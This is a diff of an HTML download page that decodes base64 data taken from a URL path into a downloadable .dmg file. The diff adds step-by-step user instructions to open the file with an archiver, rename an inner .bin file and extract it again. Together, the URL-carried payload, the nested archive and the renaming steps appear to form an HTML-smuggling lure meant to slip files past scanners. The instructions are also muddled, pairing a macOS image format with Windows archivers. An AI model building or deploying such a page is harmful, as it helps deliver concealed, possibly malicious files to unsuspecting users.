@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download DOCX</title>
+    <title>Download DMG</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -64,7 +64,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>Download DOCX</h1>
+        <h1>Download DMG</h1>
         <input type="text" id="urlInput" placeholder="Paste URL here...">
         <button id="processUrlBtn">Process URL</button>
         <br><br>
@@ -72,7 +72,35 @@
         <br>
         <a id="downloadLink" style="display:none;">Download</a>
     </div>
-
+    <div class="instructions">
+    <h2>Instructions to Extract Your File</h2>
+    <ol>
+        <li>
+            <strong>Download the dmg File:</strong>
+            After clicking the download link, a file with a random number and the dmg extension will be saved to your device.
+        </li>
+        <li>
+            <strong>Open the dmg File:</strong>
+            Use an archiving tool (like WinRAR, 7-Zip, or any other compatible software) to open the downloaded dmg file.
+        </li>
+        <li>
+            <strong>Locate the .bin File:</strong>
+            Inside the dmg file, you will find a .bin file. This file contains your original content.
+        </li>
+        <li>
+            <strong>Rename the .bin File:</strong>
+            Right-click on the .bin file and choose to rename it. Change the file extension from .bin to .dmg. For example, if the file is named <code>random_number.bin</code>, rename it to <code>filename.dmg</code>.
+        </li>
+        <li>
+            <strong>Extract the .dmg File:</strong>
+            Now, use the archiving tool again to extract the newly renamed <code>filename.dmg</code> file. This will reveal the original file content.
+        </li>
+        <li>
+            <strong>Access Your Original File:</strong>
+            After extraction, you will find your original file content in the extracted folder. You can now open or use it as needed.
+        </li>
+    </ol>
+    </div>
     <script>
         // Set the current page URL in the input field when the page loads
         window.onload = function() {
@@ -81,7 +109,7 @@
 
         document.getElementById('processUrlBtn').addEventListener('click', function() {
             const urlInput = document.getElementById('urlInput').value;
-            const encryptedDataPattern = /\/\/[^\/]+\/docx\/([^ ]+)/; // Adjusted regex to match any domain
+            const encryptedDataPattern = /\/\/[^\/]+\/dmg\/([^ ]+)/; // Adjusted regex to match any domain
 
             let encryptedData = '';
 
@@ -95,7 +123,7 @@
             }
 
             // Prepare the full Base64 URL
-            const base64Url = `data:application/vnd.openxmlformats-officedocument.wordprocessingml.document;base64,${encryptedData}`;
+            const base64Url = `data:application/dmg;base64,${encryptedData}`;
 
             // Show the output URL
             const outputUrl = document.getElementById('outputUrl');
@@ -105,9 +133,9 @@
             // Create a download link
             const downloadLink = document.getElementById('downloadLink');
             downloadLink.href = base64Url;
-            downloadLink.download = 'downloaded_file.zip'; // Change this if you want a different filename
+            downloadLink.download = 'downloaded_file.dmg'; // Change this if you want a different filename
             downloadLink.style.display = 'block';
-            downloadLink.innerText = 'Download DOCX File';
+            downloadLink.innerText = 'Download .dmg File';
         });
     </script>
 </body>
